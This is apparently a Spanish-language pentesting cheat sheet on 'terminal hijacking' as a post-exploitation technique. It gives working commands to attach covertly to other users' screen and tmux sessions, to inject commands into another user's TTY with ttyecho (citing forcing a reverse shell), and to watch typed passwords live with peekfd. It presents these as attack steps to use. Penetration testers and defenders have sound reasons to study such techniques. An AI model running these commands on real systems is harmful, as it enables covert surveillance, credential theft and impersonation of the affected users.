---
title: Terminal Hijacking (Secuestro de Sesión)
pubDate: 2026-05-22
---

## ¿Qué es el Terminal Hijacking?
Consiste en tomar el control o espiar una sesión de terminal activa de otro usuario en el sistema. Es una técnica de post-explotación muy potente para capturar contraseñas tecleadas en vivo o para ejecutar comandos en nombre de otro usuario.

### Requisitos
*   Tener acceso como **root** o permisos de **sudo**.
*   Que el usuario objetivo tenga una sesión abierta (`pts` o `tty`).

---

## 🚀 1. Secuestro de Multiplexores (Screen / Tmux)
Si el administrador utiliza estas herramientas para mantener procesos en segundo plano, puedes unirte a su sesión sin que lo note.

### A. Screen
```bash
# Listar sesiones activas de todos los usuarios
screen -ls

# Conectarse a una sesión específica
screen -x <usuario>/<id_sesion>
```

### B. Tmux
```bash
# Listar sesiones de tmux
tmux ls

# Adjuntarse a una sesión
tmux attach -t <id>
```

---

## 🛠️ 2. Inyección de Comandos (TTYEcho)
Si quieres ejecutar un comando en la terminal de otra persona (ej: para forzar una reverse shell desde su sesión).

```bash
# Identificar la TTY del usuario (ej: /dev/pts/1)
who

# Inyectar el comando (requiere la herramienta ttyecho)
ttyecho -n /dev/pts/1 "whoami"
```

---

## 🕵️ 3. Espionaje de TTY (Peekfd)
Permite ver en tiempo real lo que un usuario está escribiendo y la salida que recibe.
```bash
# Ver el tráfico de descriptores de archivos de un proceso
peekfd -8 <PID_DEL_PROCESO_BASH>
```

> **Tip:** Usa el comando `w` o `who` para ver rápidamente quién está conectado, desde qué IP y en qué TTY se encuentra.
